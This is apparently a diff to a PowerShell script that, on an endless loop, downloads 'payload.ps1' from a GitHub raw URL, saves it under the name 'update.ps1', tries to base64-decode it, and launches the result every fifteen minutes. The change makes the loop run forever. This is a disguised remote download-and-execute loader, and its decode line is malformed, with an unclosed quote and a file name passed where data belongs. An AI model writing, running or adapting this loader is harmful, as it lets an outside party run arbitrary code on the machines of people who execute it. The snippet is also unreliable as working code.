@@ -1,5 +1,5 @@
-do{
+while($true){do{
   PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/KarlyMcIntosh/main.ps1/master/payload.ps1','update.ps1');
   [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('update.ps1)) > updates.ps1; Start-Process updates.ps1;
   start-sleep -Seconds 900
-}until($infinity)
+}until($infinity)}
